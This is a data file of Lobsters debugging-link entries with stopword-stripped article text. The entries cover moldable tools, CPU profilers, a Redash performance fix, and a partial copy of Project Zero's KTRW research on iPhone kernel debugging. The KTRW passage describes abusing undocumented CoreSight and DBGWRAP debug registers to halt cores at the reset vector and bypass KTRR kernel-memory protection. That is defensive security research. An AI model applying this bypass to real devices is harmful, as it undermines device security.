136,Lobsters,debugging,Debugging,Moldable tools; a book and a movement,http://blog.rfox.eu/Bystroushaak%20s%20blog/English%20section/Moldable%20tools%20a%20book%20and%20a%20movement.html,moldable tool book movement,moldable tool terminological detour domain abstraction http demonstration domain abstraction tool problem wrong level abstraction tinyself moldable movement raising domain abstraction helvetia moldable tool inspector lulucom spotter debugger lulucom lulucom highlight lulucom interesting quote lulucom lulucom lulucom note quality release lulucom lulucom download link university bern,dissertation form book called moldable tool concretizes give voice idea developer historically typically focused around smalltalk retrospect little exaggeration people around idea called moldable movement let see idea book moldable tool aimed programmer reader understood programmer using debugger object inspector system search tool typically written way possible change extend functionality motive constantly repeated book understanding development tool lens developer perceive reason software system analogy followed contemplation topic ensure move towards maximal tool abstraction direction lowlevel technical realization computer towards domain abstraction modeled system generic development tool allow developer directly reason term domain abstraction usually enabled various tool tailored particular application domain tool however general usually hard extend moldable movement trying intertwine two approach offer kind framework way thinking make easier create software effectivity classical development tool allow easy extensibility including transition higher level abstraction terminological detour domain abstraction actually meant term domain abstraction programming perceived modeling creation program solves problem looked creation model domain abstraction kind simulation accurate enough essence solve given problem imagine example modeling physically accurate program used model certain situation example junction see well traffic flow wind turbine using simulation ass efficiency see behave storm image come video http programming viewed certain point view similar modeling real world example often experience working database table literally model customer administrator various customer record also define access essence many task understood modeling desired state program physical mathematical logical engine define solve correct incorrect change state model objectoriented programming directly inspired approach hence us object modeling however mean paradigm modeling domain abstraction occurs different language level model abstraction using object use nested function recursive logical inference engine pattern matching pure mathematics demonstration domain abstraction tool domain abstraction general programming language practically always expressed one construct language example object requires fairly extensive description definition method accurately model example relationship customer eshop purchased good eshop worker shipment programmer point view almost always make sense create tool working domain abstraction almost every eshop nt work domain abstraction model using repl shell programming language graphical interface example possible cancel order clicking button monitor status found one successful example previous work worked system analyze image security camera realtime identify individual object perform highlevel operation among thing subsystem monitoring underground tunnel people frequently pas trough tell operator many people went inside system able distinguish kind thing moving tunnel whether train various animal like rat cat crow train system senior developer created domain abstraction tool case necessary retrain system evaluated something wrong way program allowed easily intuitively browse video frame simply using mouse cursor could mark different color various object frame people aforementioned crow train system used data train classifier program like one impressed especially allowed transition lowlevel domain model description highlevel domain abstraction standard lowlevel model worked developer consisted snapshot bitmap color blob lot code raw vector data trained classifier one understand exactly system work low level able understand data system work hand program used classification simple intuitive small child would able use problem wrong level abstraction debugging laborious activity requiring much manual repetitive work one hand debugger support languagelevel operation developer think term domain abstraction consequence developer need mentally construct highlevel abstraction top language construct timeconsuming hand debugger rarely provide support identifying navigating highlevel abstraction lead repetitive task increase debugging time debugger typical example program work level debugged language many case wrong level abstraction code eshop customer cause error often problem find customer dive lowlevel representation sudden faced customerid object representation orm database mapping plain sql query programming language interpreter written restrictive compiled version python theoretically option use python tool debug namely pdb debugger pycharm debugger find error language usually run problem caused fact debugger used work low level modeled problem model lexer parser compiler bytecode interpreter debugger however offer debugging programming language matter modeled example problem finding correct parent slot replace inheritance selflike language experience classbasedprogramminglanguages imagine object whose class inherited another class attribute error occurred trying access attribute tried debug error constantly coming across fact use python tool actually debugging low level model one bytecode instruction execute interpreter necessary go hundred line python code typically necessary go dozen instruction understood nature problem time reached correct point spent half hour stepping code interpreter feeling getting trying fix grammatical error looking letter paper microscope moment try fix error text interested representation exact distribution particle ink paper although entirely possible use level abstraction low everyday life likewise needed move tinyself object instead representation find problem moldable movement raising domain abstraction book author explores various possibility extensibility typically achieved example focus various architecture application plugins created among thing discus analyzes integration plugins within standard api use connector message bus also examines assembly application unix style various study real user show difficult create plugin extend functionality component also focus way raise level domain abstraction development tool mention two approach general programming language lack language construct specific domain developer must use language element model domain abstraction python element often include object context manager decorator contrast language allow define different dsl use dynamically example helvetia rebol allows directly access bnf parser define new grammar make possible example use english parser business logic middle language also basic installation come data type grammar url email various currency instead create object manually would done python emailaddress adresscz language directly understands email address directly creates target native object thus rising domain abstraction achieved modifying language match domain example possible define native object parser customer various transaction eshop debugger tool distinguish extended nonextended part support greater abstraction somehow moldable tool hand focus adapting existing tool instead language modification applied language debugger inspector instrument following principle proposed identify common type developer extension optimize complexity creation new extension nt limit possible extension developer adapt extend individual tool fit relevant development context creating domainspecific extension capture specific abstraction attaching activation predicate tool run display specific context includes previous interaction tool book course discussed explained great detail everything contained blog quick overview author created three different tool verify thesis moldable tool tool allow explore think runtime object behavior abstraction inspector inspector allows object define displayed adding special method object something like repr str tostring user interface inspector debugger spotter example object containing image display specific bitmap graphical interface element widget svg map outline particular country color object show square color addition object define display predicate specifies display well control example allow color object change color setting graphically using color palette instead entering hexadecimal value nt one display predicate depending context possible display svg image bitmap opened vector editor listed point table xml representation andrei moldable tool lulucom isbn way inspector allows displaying object context also offer ability explore connected object browse well history displayed object context like user click hyperlink web page spotter spotter offer something like search engine individual object based activation predicate defined directly object example search object value tag general offer object simple way offer search based domain abstraction line also try offer automatically discovered depending context word author spotter offer inexpensive creation search processor support multiple data source contextaware search improved search result achieved group rank result ii support rapid skimming result set iii enable indepth exploration result set debugger debugger comprehension tool page probably biggest amount work focused debugger integrates previous approach try move abstraction high possible moldable debugger allow developer create automate highlevel abstraction user define graphical representation grouping relevant debugging operation specific domain context debugger also offer automatic discovery suitable debugger allows switched dynamically andrei moldable tool lulucom isbn example see debugger parser andrei moldable tool lulucom isbn typical extension consists domainspecific debugging operation domainspecific view based debugging session developer create domainspecific extension extending debugging session additional functionality creating domainspecific debugging predicate operation specifying domainspecific debugging view linking debugging operation graphical widget highlight really liked fact book backed number author tested theory several dozen developer checked statistic interested much tool used suit people nt average length written extension andrei moldable tool lulucom isbn last point deserves elaborated one project objective simplify creation new extension much possible mean adjustment creation new functionality taken place quickly also relatively short undemanding seen table also several table book objective indeed succeeded success also seen adoption acceptance instrument official part pharo smalltalk book author truly remarkable amount metathinking moreover presented easytounderstand way helped lot understand alan kay meant talked using computer simulation used take literally sense physical simulation somewhere cad retrospect clear nt mean physical level level modeling domain abstraction wondering development tool look like year perhaps want participate effort strongly recommend reading book interesting quote two way constructing software design one way make simple obviously deficiency way make complicated obvious deficiency first method far difficult demand skill devotion insight even inspiration discovery simple physical law underlie complex phenomenon nature car hoare software expressed using programming language crafted aid tool programming language framework communication transferring abstract model real world human mind computer ingalls evolved provide developer vocabulary hide detail computer strive enable developer create express software application term domain abstraction occurred since expressing software term domain abstraction rather generic programming language construct positive impact program comprehension nevertheless software physical shape developer craft software exclusively interacting development tool development tool provide mean transforming abstract model real world mind program ie executable model within design space programming language hence development tool direct impact thinking habit developer affecting perceive craft reason software dijkstra even developer design software application term domain abstraction take advantage domain abstraction creating evolving application development tool need incorporate domain abstraction andrei moldable tool lulucom isbn hence generic disconnected approach integrating searching ides lead information foraging loop significant effort wasted recovering concept instead directly reasoning term concept andrei moldable tool lulucom isbn software contextual design stakeholder developer technology randomness everyday life make software system unique yet crafting software tool act software system entire work showing case tool mean end shape shape u andrei moldable tool lulucom isbn note quality release lulucom lulucom webbased service let print custom book demand also allows author easily start selling book demand printing nothing printed advance result risk may left hundred piece unmarketable book somewhere warehouse happens classical publisher novice author although great service often use print example manual various paper longer fifty page quality glued book quite poor first book disintegrated hand reading personally take book degree consumer good seems drop much download link book available creative common license university bern
137,Lobsters,debugging,Debugging,"gprof, Valgrind and gperftools - an evaluation of some tools for application level CPU profiling",http://gernotklingler.com/blog/gprof-valgrind-gperftools-evaluation-tools-application-level-cpu-profiling-linux/,gprof valgrind gperftools evaluation tool application level cpu profiling,valgrind cpuload gklinglercpuprofilingdemo gprof gprof gprof statistical inaccuracy official documentation valgrindcallgrind valgrind tool kcachegrind gperftools doc conclusion comparison gprof valgrind gperftools,post give overview evaluation three different cpu profiling tool gperftools valgrind gprof evaluated three tool usage functionality accuracy runtime overhead usage different profilers demonstrated small demo program cpuload available via github repository gklinglercpuprofilingdemo intent cpuloadcpp generate someâ cpu load nothing useful bash script repo also listed show compilelink cpuloadcpp appropriately execute resulting executable get cpu profiling data gprof gnu profiler gprof us hybrid approach compiler assisted instrumentation sampling instrumentation used gather function call information eg able generate call graph count number function call gather profiling information runtime sampling process used mean program counter probed regular interval interrupting program operating system interrupt sampling statistical process resulting profiling data exact rather statistical approximation gprof statistical inaccuracy creating cpu profile application gprof requires following step compile link program compatible compiler profiling enabled eg gcc pg execute program generate profiling data file default filename gmonout run gprof analyze profiling data let apply demo application binbash build program profiling support gp g pg cpuloadcpp cpuload run program generates profiling data file gmonout cpuload print callgraph gprof cpuload gprof output consists two part flat profile call graph flat profile report total execution time spent function percentage total running time function call count also reported output sorted percentage hot spot top list gprof call graph textual call graph representation show caller callees function detailed information interpret callgraph take look official documentation also generate graphical representation callgraph withâ tool generate graphical representation gprof callgraph overhead mainly caused instrumentation quite high estimated gprof support profiling multithreaded application also profile shared library even exist workarounds get threading support fact profile call shared library make totally unsuitable today realworld project valgrindcallgrind valgrind instrumentation framework building dynamic analysis tool valgrind basically virtual machine time recompilation machine code simpler risclike intermediate code ucode execute machine code directly simulates fly generated ucode various valgrind based tool debugging profiling purpose depending chosen tool ucode instrumented appropriately record data interest performance profiling interested tool callgrind profiling tool record function call history callgraph analyzing collected profiling data amazing visualization tool kcachegrind represents collected data nice way tremendously help get overview whats going creating cpu profile application valgrindcallgrind really simple requires following step compile program debugging symbol enabled get meaningful callgraph execute program valgrind toolcallgrind yourprogramâ generate profiling data file analyze profiling data eg kcachegrind let apply demo application profilevalgrindsh binbash build program special flag needed g cpuloadcpp cpuload run program callgrind generates file viewed kcachegrind valgrind toolcallgrind cpuload open profilecallgrind kcachegrind kcachegrind profilecallgrind contrast gprof need rebuild application special compile flag execute executable valgrind course executed program contain debugging information get expressive call graph human readable symbol name see kcachegrind profiling data cpuload demo downside valgrind enormous slowdown profiled application around factor make impracticable use largerlonger running application profiling result influenced measurement gperftools google provides set tool aimed analyzing improving performance multithreaded application offer cpu profiler fast thread aware malloc implementation aâ memoryâ leakâ detector heap profiler focus sampling based cpu profiler creating cpu profile selected part application gperftools requires following step compile program debugging symbol enabled get meaningful call graph link gperftools profilerso include gperftoolsprofilerh surround section want profile profilerstart nameofprofilelog profilerstop execute program generate profiling data file analyze profiling data use pprof distributed gperftools convert callgrind compatible format analyze kcachegrind let apply demo application profilegperftoolssh binbash build program demo program specify dwithgperftools enable gperftools specific ifdefs g dwithgperftools lprofiler g cpuloadcpp cpuload run program generates profiling data file profilelog example cpuload convert profilelog callgrind compatible format pprof callgrind cpuload profilelog profilecallgrind open profilecallgrind kcachegrind kcachegrind profilecallgrind alternatively profiling whole application done without change recompilationlinking cover recommended approach find doc gperftools profiler profile multithreaded application run time overhead profiling low application run native speed use kcachegrind analyzing profiling data converting cachegrind compatible format also like possibility able selectively profile certain area code want easily extend program enabledisable profiling runtime conclusion comparison gprof dinosaur among evaluated profilers root go back seems widely used good solution past decade limited support multithreaded application inability profile shared library need recompilation compatible compiler special flag produce considerable runtime overhead make unsuitable using today realworld project valgrind delivers accurate result well suited multithreaded application easy use kcachegrind visualizationanalysis profiling data slow execution application test disqualifies larger longer running application gperftools cpu profiler little runtime overhead provides nice feature like selectively profiling certain area interest problem multithreaded application kcachegrind used analyze profiling data like sampling based profilers suffers statistical inaccuracy therefore result accurate valgrind practically usually big problem always increase sampling frequency need accurate result using profiler large codebase personal experience definitely recommend using hope liked post always question kind feedback please leave comment
139,Lobsters,debugging,Debugging,How We Spotted and Fixed a Performance Degradation in Our Python Code,https://blog.redash.io/how-we-spotted-and-fixed-a-performance-degradation-in-our-python-code/,spotted fixed performance degradation python code,word difference celery rq benchmarking profiling,recently started transitioning using celery using rq task running engine phase one migrated job directly running query job include thing like sending email figuring query need refreshed recording user event maintenance jobsafter deploying noticed rq worker required significantly cpu perform amount task celery worker thought share profiled remedied problema word difference celery rqboth celery rq concept worker process use forking allow parallelized execution job launch celery worker fork several different process one autonomously handle task rq worker instantiate single subprocess known work horse perform single job die worker fetch another job queue fork new work horsein rq achieve parallelism celery simply running worker process however subtle difference celery rq celery worker instantiate multiple subprocesses launch time reuse multiple task rq fork every job pro con approach scope postbenchmarkingbefore profiled anything wanted benchmark long take worker container process job decided focus recordevent job since frequent lightweight operation used time command measure performance required couple change source code measure job preferred rq burst mode exit process handling job wanted avoid measuring job might scheduled time benchmarking moved recordevent dedicated queue called benchmark replacing job default job benchmark right recordevent declaration tasksgeneralpy start timing thing first wanted see long take worker start stop without job subtract time result later dockercompose exec worker bash c time managepy rq worker benchmark real user sys initialization take second machine remember thatthen shoved dummy recordevent job onto benchmark queue dockercompose run rm server manage shell redashtasksgeneral import recordevent recordeventdelay action create timestamp orgid userid objectid objecttype dummy range let run worker command see long take process job dockercompose exec worker bash c time managepy rq worker benchmark real user sys boot time see took second worker handle job let try figure use pyspy worker working hard profilinglet add another job last measurement consumed run worker simultaneously spy dockercompose run rm server manage shell redashtasksgeneral import recordevent recordeventdelay action create timestamp orgid userid objectid objecttype dummy range dockercompose exec worker bash c nohup managepy rq worker benchmark sleep pip install pyspy rq info u redis grep busy awk print grep p sd head n xargs pyspy record subprocesses profilesvg p open google chrome profilesvgi know last command quite handful ideally would break command every readability command run sequentially inside dockercompose exec worker bash session quick breakdown start burst worker background wait second roughly get finish booting install pyspy run rqinfo slice pid one worker record second activity pid save profilesvg result flame graph digging inside flame graph noticed recordevent spends big portion execution time sqlalchemyormconfiguremappers happens every job execution doc saw initialize intermapper relationship mapper constructed thus farthis sort thing really need happen every fork could initialize relationship parent worker avoid repeated effort work horsesso added call sqlalchemyorgconfiguremappers starting work horse measured dockercompose run rm server manage shell redashtasksgeneral import recordevent recordeventdelay action create timestamp orgid userid objectid objecttype dummy range dockercompose exec worker bash c time managepy rq worker benchmark real user sys deduct second boot time second second worker handle job improvement fix managed slice rq production resource keep throughputmy key takeaway keep mind app behaves differently single process fork heavy lifting perform every job usually good idea fork kind thing show testing development make sure measure well dig performance issue come
141,Lobsters,debugging,Debugging,KTRW: The journey to build a debuggable iPhone,https://googleprojectzero.blogspot.com/2019/10/ktrw-journey-to-build-debuggable-iphone.html,ktrw journey build debuggable iphone,,posted brandon azad project zero role project zero use tooling used external io security researcher particular developmentfused iphones hardware debugging capability like jtag enabled believe access device put obtain significant advantage researcher wish use thus early year decided would try find way build capability using regular iphones buy apple store identified iboot ktrr primary area research spent several month looking vulnerability june discovered soc used iphone iphone x coresight external debug register enabled combined capability reversed proprietary debugging register called dbgwrap sufficient debug cpu time operation including execution reset vector core sleep mmu ktrr reenabled singlestepping execution reset vector modifying register state key point possible skip mmu ktrr lockdown remap protected kernel memory writable used capability build hardwarelevel singlestep kernel debugger iphone x called ktrw used lldb ida pro work offtheshelf lightning cable research conducted released io securerom exploit independent bootstrapping problem security research iphones hard opinion much harder need apple done impressive job locking device security improvement certainly welcome mean security researcher invest lot time effort create viable research platform need maintain research platform create perverse incentive wellintentioned security researcher one common outcome researcher hoard vulnerability reporting keeping rest bootstrapping course le ideal since vulnerability could simultaneously used attack user alternatively many security researcher able acquire developmentfused iphones hardware debugging feature swd jtag enabled allowing debug main application processor ap peripheral like always processor aop secure enclave processor sep halting execution bootloader possible patch kernel disable security feature kernel even chance run make device extremely useful security research recently virtualization solution gained prominence io security research community principle virtualization offer way conduct security testing io without subject hardware restriction prevent kernel modification caveat product often accessed web would mean experiment conducted virtualized device could theory visible company providing service none option sit well withhold security bug use developmentfused device feel appropriate run sensitive experiment could disclose potential io security vulnerability third party server put disadvantage relative adversary developing deploying capability may using strategy thus back march decided would worthwhile investigate whether possible create homebrewed development iphone using certified apple part ktrr hardware mitigation heart make conducting security research io difficult hardware mitigation called ktrr likely stand kernel text readonly region siguza excellent article ktrr highly recommend reading since apple publish detail hardware mitigation hard know exact boundary mitigation post try use terminology suggested public xnu source even though differs term used article effect ktrr stronger form wx protection enforced memory access implemented memory management unit mmu memory controller apple memory controller appears referred amcc source mmus amcc programmed physical address range respectively referred mmu ktrr region amcc ktrr region mmu ensures writes physical address within mmu ktrr region instruction fetch address outside region generate synchronous exception likewise amcc ensures writes issued memory controller physical address inside amcc ktrr region discarded way kernel lock executable code readonly data modified new executable code injected order lock mmu apple defined three new system register define lower upper bound mmu ktrr region lockdown register value written three register locked longer modified although still lose value core reset core wake sleep mmu enabled enforces memory writes mmu ktrr region instruction fetch outside region generate synchronous exception mean regardless permission bit specified page table regardless configuration system register including aprr register impossible memory writable executable impossible change memory executable however implementing ktrr mmu alone enough ensure kernel code integrity example dma attack attack peripheral would reach memory controller without first passing mmu application processor thus apple bring ktrr amcc well readonly region lockdown register accessible via memorymapped io mmio combination implementing ktrr mmu amcc make extremely effective mmu amcc ktrr region protect critical kernel resource including page table root page table describing readonly region instruction might used break ktrr moved special page lastpinst outside mmu ktrr range making nonexecutable inside amcc ktrr range making nonwritable particular executable copy instruction msr set new page table root address translation kernel half address space instruction msr could used turn mmu last part true apple added new hardware mitigation brings back executable memory order bypass ktrr load new executable code one would need find way prevent mmu ktrr lockdown occurring however attack surface incredibly slim core wake sleep system begin executing reset vector lowresetvectorbase program lock mmu ktrr register within first instruction goal research iphone know exactly feature think would useful homebrewed research iphone important feature also hardest achieve possible patch ktrrprotected kernel memory particular patch textexec segment contains kernel executable code possible would become easy disable mitigation like codesigning make userspace security research difficult possible perform singlestep io kernel debugging would aid runtime analysis kernel make easier demonstrate incorrect behavior poc vulnerability tied specific version io possible debug new kernel version come either updating device normally chainloading updated kernel usable existing debugging tool particular wanted able perform kernel debugging live productionfused iphone using lldb ida pro relatively easy port newer version io fact research concept nothing new goal partially demonstrated back io goal demonstrated io io yalu ktrr bypass luca todesco qwertyoruiopz demonstrated ktrr bypass io remapped kernel dataconst segment normally protected ktrr writable technique relied two component one gain code execution reset another remap ktrrprotected memory first luca used fact writable data used reset path lowresetvectorbase gain code execution every reset ktrr bypass since ktrr already initialized mmu turned point gained code execution useful persisting true bypass would applied every time core reset second offbyone error mmu ktrr lockdown code lowresetvectorbase resulted lastpinst page accidentally included mmu ktrr region meaning instruction msr left executable even mmu turned take advantage luca used first capability execute rop payload reset rop payload would bypass ktrr using executable msr instruction set new page table base remapped dataconst new writable physical page reason textexec left readonly bypass ran ktrr already initialized mmu even though page table could changed mmu still prevented physical page except original one protected ktrr amcc region executed thus remained impossible patch kernel executable code io build io kernel debugger precedent work came io ian beer released asyncwakeioswithkdp singlestep kernel debugger worked lldb absolutely read slide mosec talk build io kernel debugger explain great detail accomplished also recommend looking source code well commented look architecture reference manual quote version ea latest time writing chapter describes interesting feature called selfhosted debug selfhosted debug support debugging generation handling debug exception taken using exception model described chapter system level programmer model within chapter debugger mean part operating system higher level system software handle debug exception program debug system register essentially architecture allows operating system program special debug register order act debugger catching exception occur certain debugrelated event encountered according manual relevant exception type include breakpoint instruction exception generated brk instruction executed breakpoint exception generated hardware breakpoint hit watchpoint exception generated hardware watchpoint hit software step exception generated software singlestep operation completes debug register configured properly event delivered synchronous exception exception vector specified register circumstance debug exception actually generated delivered pe generate particular debug exception debug exception enabled current exception level security statesee enabling debug exception current exception level page breakpoint instruction exception always enabled current exception level security state debugger enabled particular debug exceptionall debug exception except breakpoint instruction exception enable control contained see debug exception enable control page reading mentioned section find following register relevant enabling selfhosted debug pstate process state real register collection important processor state information relevant flag debugging exception mask bit debug exception mask set debug exception suppressed field reset exception taken f asynchronous exception mask bit bit mask serror irq fiq interrupt respectively monitor debug system control register register hold main debug configuration option mde monitor debug enable control whether breakpoint watchpoint exception enabled kde kernel debug enable enables kernel running catch debug exception dbgbcr n debug breakpoint control register n n register control behavior hardware breakpoints dbgbvr n debug breakpoint value register n n register contain information match virtual address corresponding breakpoint trigger dbgwcr n debug watchpoint control register n n register control behavior hardware watchpoints dbgwvr n debug watchpoint value register n n register contain information match virtual address corresponding watchpoint trigger basically ian debugger worked finding appropriate system call mach trap gadget sequence set register necessary value thus enabling hardware breakpoints allowing kernel mode generate debug exception final piece catching debug exception able trigger kernel breakpoint exception much use somehow catch exception dump register memory resume normal execution ian found exception handling function slehsynchronous actually enters deliberate infinite loop catch breakpoint exception kernel void slehsynchronous armcontextt context esr vmoffsett far esrexceptionclasst class esrec esr armsavedstatet state context s switch class case fscdebugfault issssdefsc esr kprintf hardware breakpoint debug exception kernel hanging design n unreachableokpush debuggercall excbreakpoint context s break unreachableokpop panic unsupported class u event code state p class u esr u far p class state class esr void far assert unreachable break point thread generated breakpoint exception enters infinite loop register state time exception spilled memory making possible inspect modify register value finally ian able restart execution debugged thread waiting preempted spinning loop modifying spilled state thread resume execution desired location ian asyncwake kernel debugger able achieve two goal mentioned debugger supported singlestepping worked lldb certainly enough make useful research platform however apple mitigated gadget ian used meaning could nt use technique recent io version ideally wanted something met five goal kernel patching singlestep debugging support io version compatibility lldb easy maintenance across io version turned iboot researching iboot initial goal find vulnerability iboot would allow boot patched kernelcache iboot apple secondstage bootloader iphone run securerom responsible loading kernelcache verifying signature jumping code execution iboot possible boot kernelcache patched disable ktrr enable debugging feature two reason iboot particularly attractive research target first iboot bug easily check updateability box iboot bug could theoretically boot kernelcache want allowing upgrade downgrade io version arbitrarily even bug fixed iphones vulnerable iboot version still able boot latest version io patched kernel second iboot bug could make possible load patched kernelcache even kernel vulnerability known currently order develop io kernel research platform need already kernel vulnerability unless withhold bug make difficult analyze latest kernel version known vulnerability fixed however iboot entry point need kernel vulnerability conduct research ultimately end finding vulnerability iboot said believe bug exist could interesting area future research path lead debug register eventually number thing drew away iboot back ktrr particular revisit concept debug register read somewhere exact source lost history debug register ian used io kernel debugger dbgbcr n etc also accessible via memorymapped interface true would mean using register singlestep kernel debugging would probably possible even apple mitigated specific gadget used initialize looking architecture reference manual table content noticed selfhosted debug chapter one place debugging mentioned fact whole section part h chapter devoted another debugging interface called external debug lowresetvectorbase xnu reset vector first instruction unlock core debuggingmsr xzr mosec zhenyu ning fengwei zhang presented interesting attack android platform called nailgun nailgun attack abuse debug register enabled certain android device break privilege barrier example extracting fingerprint image stored trustzone protected memory thus debug register really mind finally decided pay attention odd panic message occasionally encountered experiment telling ever played around iphone managed get core stuck infinite loop interrupt disabled may received panic message go something like panicstring attempting forcibly halt cpu failed halt error halt supported configurationndebugger synchronization timed waited nanosecondsnpanic cpu caller wdt timeout cpu failed respond buildroot message say application processor watchdog timer wdt timed waiting cpu core happens core fails check applearmwatchdogtimer kext several second caught attention first part panic string attempting forcibly halt cpu forcibly halting cpu running really sound like sort cpu control register might involved error string grep starting place searching string xnu source found function debuggerxcallenter file osfmkarmmodeldepc contained following interesting snippet cpu maxcpu cpu proceedonsyncfailure paniclogappendnoflush attempting forcibly halt cpu dn cpu dbgwrapstatust haltstatus mldbgwraphaltcpu cpu haltstatus paniclogappendnoflush cpu failed halt error sn cpu haltstatus mldbgwrapstrerror haltstatus comment debuggerxcallenter state function responsible interrupting core ap core run singlethreaded context seeing loop function mldbgwraphaltcpu seems one actually work halt specific core looking file osfmkkerndebugc see debuggerxcallenter indeed called part panic path mldbgwraphaltcpu actually halt running cpu core implementation file filled interesting information implementation mldbgwraphaltcpu dbgwrapstatust mldbgwraphaltcpu int cpuindex timeoutns cpudatat cdp cpudatap cpuindex cdp null cdp coresightbase coresightutt return dbgwraperrunsupported volatile dbgwrapregt dbgwrapreg volatile dbgwrapregt cdp coresightbase coresightutt dbgwrapregoffset mldbgwrapcpuishalted cpuindex return dbgwrapwarnalreadyhalted clear writable bit besides dbghalt none powerdown reset bit must set dbgwrapreg dbgwrapdbghalt else return dbgwrapsuccess tell u lot tantalizing information cpudatap function retrieves pointer current core cpudata struct whatever coresightbase array one ap core see assignment value derived array volatile variable called dbgwrapreg name fact declared volatile strongly suggest dbgwrapreg pointer sort mmio reading writing directly read write corespecific register comment suggests dbgwrap register contains bit involved halting powering resetting core real gem bit keep scrolling past mldbgwraphaltcpu find fascinating function called mldbgwraphaltcpuwithstate dbgwrapstatust mldbgwraphaltcpuwithstate int cpuindex timeoutns dbgwrapthreadstatet state cpudatat cdp cpudatap cpuindex cdp null cdp coresightbase coresighted return dbgwraperrunsupported ensure memorymapped coresight register written volatile cdp coresightbase coresighted armdebugoffsetdbglar armdbglockaccesskey dbgwrapstatust status mldbgwraphaltcpu cpuindex timeoutns core fully powered eg idling wfi still halted dbgwrap register certain coresight register edprsr alwayson domain however edscreditr alwayson domain generate parity abort read edprsr safely read case o lock default set clear first thing use detect offline state volatile cdp coresightbase coresighted edprsrregoffset edprsroslk bzero state sizeof state return dbgwrapwarncpuoffline instr unsigned int sizeof state x sizeof state x instr msr x mldbgwrapstuffinstr cdp instr timeoutns status state x mldbgwrapreaddtr cdp timeoutns status instr msr fp mldbgwrapstuffinstr cdp instr timeoutns status state fp mldbgwrapreaddtr cdp timeoutns status instr msr lr mldbgwrapstuffinstr cdp instr timeoutns status state lr mldbgwrapreaddtr cdp timeoutns status stack pointer ca nt used register operand msr register treated xzr rather sp used transfer operand instead load sp gpr already saved store register dtr chosen temporary gpr since reserved abi unused xnu overwriting pose least risk causing trouble external debugger instr mov sp mldbgwrapstuffinstr cdp instr timeoutns status instr msr mldbgwrapstuffinstr cdp instr timeoutns status state sp mldbgwrapreaddtr cdp timeoutns status reading pc eg adr undefined debug state instead use contains pc time entry debug state instr mr mldbgwrapstuffinstr cdp instr timeoutns status instr msr mldbgwrapstuffinstr cdp instr timeoutns status state pc mldbgwrapreaddtr cdp timeoutns status reading cpsr undefined debug state instead use contains cpsr time entry debug state instr mr mldbgwrapstuffinstr cdp instr timeoutns status instr msr mldbgwrapstuffinstr cdp instr timeoutns status state cpsr mldbgwrapreaddtr cdp timeoutns status return status mldbgwraphaltcpuwithstate appears halt specified cpu core retrieve register state remarkable remarkable way order retrieve value register halted cpu core function actually force halted cpu execute instruction write generalpurpose register value special debug register called instruction generated programmatically fly preexisting instruction protected ktrr mean least theory might possible make cpu core execute ktrrsensitive instruction like msr even copy instruction ktrrprotected memory digging deeper next step figure debug register actually enabled bit research revealed register mentioned dbgwrapc related feature called external debug debug architecture embedded called coresight let start latter external debug interface much simpler describe documented part h architecture reference manual like selfhosted debug provides debug exception cause core execute debugger code exception vector external debug provides debug event cause core enter debug state debug event mentioned manual exception catch debug event external debugger program core generate exception catch debug event every time core enters particular exception level reset catch debug event event generated every time core reset execute reset vector breakpoint debug event event generated core hit hardware breakpoint watchpoint debug event event generated core hit hardware watchpoint halting step debug event event generated core completes executing instruction part singlestep operation debug event occurs core halt enter debug state manipulated external debugger manual external debug debug event allow external debugger halt pe pe enters debug state pe debug state stop executing instruction location indicated program counter instead controlled external debug interface instruction transfer register itr pass instruction pe execute debug state debug communication channel dcc pass data pe debugger pe service interrupt debug state instruction transfer register itr debug communication channel dcc respectively responsible making halted core execute instruction transferring data halted core mldbgwraphaltcpuwithstate order read register halted core function mldbgwrapstuffinstr us memorymapped itr supply halted core instruction move desired register value system register value read function mldbgwrapreaddtr using memorymapped dcc register finding register xnu code seems suggest external debug register exist find tracing xnu source find function configurecoresightregisters static void configurecoresightregisters cpudatat cdp coresight register optional device tree provide cpuregmappaddr assume coresight register supported cdp cpuregmappaddr coresightregions skip cti register debugonly present production hardware least one known cyclone erratum involving cti rdar known client need kernel unlock cti safer avoid access coresightcti continue skip debugonly register production chip coresighted coresightutt coresightdebugenabled continue cdp coresightbase addr cdp cpuregmappaddr coresightoffset cdp coresightbase vmoffsett mliomap addr coresightsize suggests coresight register external debug crosstrigger interconnect cti something called utt mapped offset fixed base address supplied io device tree device tree passed xnu iboot specifies parameter system hardware including physical address special hardware register used interact device case comparing device tree value cpuregmappaddr read runtime learned base address coresight register cpu core n found device tree property cpuscpu n regprivate iphone address n core n thus assuming enabled one would need order access external debug register map physical address n whatever regprivate address device tree read write offset available manual corresponding register testing debug register register used mldbgwraphaltcpuwithstate documented manual know base address mapped necessarily mean feature implemented accessible production hardware order find needed test whether debug authentication signal whether debug register actually worked according manual implementationdefined authentication interface external debug feature authentication signal corresponding debug feature disabled signal debug feature available check debug authentication signal enabled read value external debug register offset architecture provides four signal snid secure noninvasive debug sid secure invasive debug nsnid nonsecure noninvasive debug nsid nonsecure invasive debug debugging feature need bypass ktrr rely nsnid nsid enabled surprisingly reading register via mmio produced suggesting signal fact enabled next step test whether mldbgwraphaltcpuwithstate could actually halt core execute instruction read core register state modifying voucherswap map coresight register manually call mldbgwraphaltcpuwithstate saw following output output window register value read mldbgwraphaltcpuwithstate look valid thus entirely possible execute dynamicallygenerated instruction halted cpu core production iphones even remarkable screenshot appears core halted executing code reset vector mmu value cpsr show core executing kernel mode interrupt disabled yet pc value normal kernel address fact physical address corresponding unslid kernel virtual address near end lowresetvectorbase specifically instruction load address constbootargs verifying reset handler reason remarkable open another possible technique bypass ktrr given halt core execute instruction mmu turned perhaps possible use debug register modify execution reset vector prevent ktrr ever enabled mmu debugging feature needed actually even though proved possible execute instruction debugged core mmu alone necessarily enough bypass ktrr example even though use dbgwrap halt core external debug interface contains mechanism get core debug state resume normal execution called restarting thus needed find feature would make debugging register useful first thing looked finding useful instruction execute debugged core even though core execute instruction written itr instruction available debug state manual specifies list instruction available related moving value register accessing system register loading storing memory even fewer actually available reason load store instruction fail execute debug state even instruction read write system register msr mr instruction work debug state thus another idea investigated whether exists system register shared core writing would change global state way facilitates ktrr bypass however without better knowledge apple proprietary system register unable find anything worked finally decided turn back dbgwrap register mentioned dbgwrapc comment mldbgwraphaltcpu suggests register contains many different bit control behavior core yet bit dbghalt halt core dbgack check core halted defined file thus suspected might bit interest performed experiment figure might turn dbgwrap actually contains least undocumented bit extremely useful setting bit cause core enter debug state next time reset execute reset vector setting bit cause core restart exiting debug state resuming normal execution setting bit seems prevent core resetting long phone plugged active ie sleeping everything necessary bypass ktrr bypassing ktrr method chose disable ktrr mmu repeated core using dbgwrap configure core enter debug state next time reset wait core halt halted execute first instruction lowresetvectorbase 